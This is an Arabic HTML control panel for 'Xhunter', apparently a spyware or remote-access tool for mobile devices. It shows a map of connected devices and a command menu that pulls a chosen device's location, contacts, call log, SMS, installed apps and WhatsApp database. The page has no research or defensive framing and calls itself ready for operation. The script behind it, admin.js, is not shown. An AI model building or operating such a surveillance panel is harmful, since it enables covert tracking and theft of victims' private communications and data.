<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>نظام استخبارات Xhunter — لوحة التحكم</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<link rel="stylesheet" href="style.css">
</head>
<body>
<header>
  <div class="title">نظام استخبارات <span>Xhunter</span></div>
</header>

<nav class="topbar">
  <div class="tabs">
    <button data-tab="map" class="tab active">الخريطة</button>
    <button data-tab="devices" class="tab">الأجهزة</button>
    <button data-tab="data" class="tab">بيانات الجهاز</button>
    <button data-tab="logs" class="tab">السجل</button>
    <button data-tab="commands" class="tab">الأوامر</button>
  </div>
  <div class="controls">
    <div class="status">أجهزة متصلة: <span id="statusCount">0</span></div>
    <div class="last">آخر حدث: <span id="lastEvent">—</span></div>
  </div>
</nav>

<main id="main">
  <!-- خريطة -->
  <section id="tab-map" class="panel active">
    <div id="map"></div>
  </section>

  <!-- أجهزة -->
  <section id="tab-devices" class="panel">
    <h3>الأجهزة المتصلة</h3>
    <ul id="deviceList" class="list"></ul>
  </section>

  <!-- بيانات الجهاز المحدد -->
  <section id="tab-data" class="panel">
    <h3>بيانات الجهاز</h3>
    <div id="deviceInfo">اختر جهازاً من تبويب "الأجهزة" لعرض بياناته</div>
  </section>

  <!-- السجل -->
  <section id="tab-logs" class="panel">
    <h3>سجل الأحداث</h3>
    <ul id="logList" class="list"></ul>
  </section>

  <!-- الأوامر -->
  <section id="tab-commands" class="panel">
    <h3>إصدار أوامر</h3>
    <div class="form-row">
      <select id="deviceSelect" class="full"></select>
    </div>
    <div class="form-row">
      <select id="commandAction" class="full">
        <option value="getLocation">طلب الموقع (Lock)</option>
        <option value="getInstalledApps">التطبيقات المثبتة</option>
        <option value="getContacts">جهات الاتصال</option>
        <option value="getCallLog">سجل المكالمات</option>
        <option value="getSMS">الرسائل</option>
        <option value="downloadWhatsappDatabase">واتساب (DB)</option>
        <option value="getExtraData">بيانات إضافية</option>
      </select>
    </div>
    <div class="form-row">
      <input id="commandData" placeholder='بيانات JSON (اختياري)' class="full"/>
    </div>
    <div class="form-row">
      <button id="sendCommand" class="primary">إرسال الأمر</button>
      <button id="clearLogs" class="secondary">مسح السجل</button>
    </div>
  </section>
</main>

<footer class="footer">
  Xhunter • لوحة الاستخبارات — جاهز للعمل
</footer>

<script src="/socket.io/socket.io.js"></script>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script src="admin.js"></script>
</body>
</html>
